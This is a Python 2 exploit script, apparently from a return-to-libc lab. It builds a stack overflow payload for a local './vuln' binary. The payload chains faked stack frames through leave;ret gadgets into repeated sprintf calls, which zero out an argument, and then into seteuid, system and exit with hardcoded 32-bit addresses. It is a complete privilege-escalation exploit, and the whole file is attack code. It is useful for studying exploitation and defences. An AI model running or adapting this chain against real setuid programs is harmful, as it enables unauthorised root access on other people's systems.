#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

fake_ebp0 = 0xbffff1b0
fake_ebp1 = 0xbffff1c8
fake_ebp2 = 0xbffff1e0
fake_ebp3 = 0xbffff1f8
fake_ebp4 = 0xbffff214
fake_ebp5 = 0xbffff224
fake_ebp6 = 0xbffff234
fake_ebp7 = 0xbffff244
leave_ret = 0x0804851c
sprintf_addr = 0xb7e6e8d0
seteuid_addr = 0xb7f09720
system_addr = 0xb7e61060
exit_addr = 0xb7e54be0
sprintf_arg1 = 0xbffff220
sprintf_arg2 = 0x80485f0
sprintf_arg3 = 0xbffff24c
system_arg = 0x804829d
exit_arg = 0xffffffff

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = "A" * 264 #Junk
buf += conv(fake_ebp0) 
buf += conv(leave_ret) 
#Below four stack frames are for sprintf (to setup seteuid arg )
buf += conv(fake_ebp1) 
buf += conv(sprintf_addr) 
buf += conv(leave_ret) 
buf += conv(sprintf_arg1) 
buf += conv(sprintf_arg2) 
buf += conv(sprintf_arg3) 
buf += conv(fake_ebp2) 
buf += conv(sprintf_addr) 
buf += conv(leave_ret) 
sprintf_arg1 += 1
buf += conv(sprintf_arg1) 
buf += conv(sprintf_arg2) 
buf += conv(sprintf_arg3) 
buf += conv(fake_ebp3) 
buf += conv(sprintf_addr) 
buf += conv(leave_ret) 
sprintf_arg1 += 1
buf += conv(sprintf_arg1) 
buf += conv(sprintf_arg2) 
buf += conv(sprintf_arg3) 
buf += conv(fake_ebp4) 
buf += conv(sprintf_addr) 
buf += conv(leave_ret) 
sprintf_arg1 += 1
buf += conv(sprintf_arg1) 
buf += conv(sprintf_arg2) 
buf += conv(sprintf_arg3)
#Dummy - To avoid null byte in fake_ebp4. 
buf += "X" * 4 
#Below stack frame is for seteuid
buf += conv(fake_ebp5) 
buf += conv(seteuid_addr) 
buf += conv(leave_ret) 
#Dummy - This arg is zero'd by above four sprintf calls
buf += "Y" * 4 
#Below stack frame is for system
buf += conv(fake_ebp6) 
buf += conv(system_addr) 
buf += conv(leave_ret) 
buf += conv(system_arg) 
#Below stack frame is for exit
buf += conv(fake_ebp7) 
buf += conv(exit_addr) 
buf += conv(leave_ret) 
buf += conv(exit_arg) 

print "Calling vulnerable program"
call(["./vuln", buf])
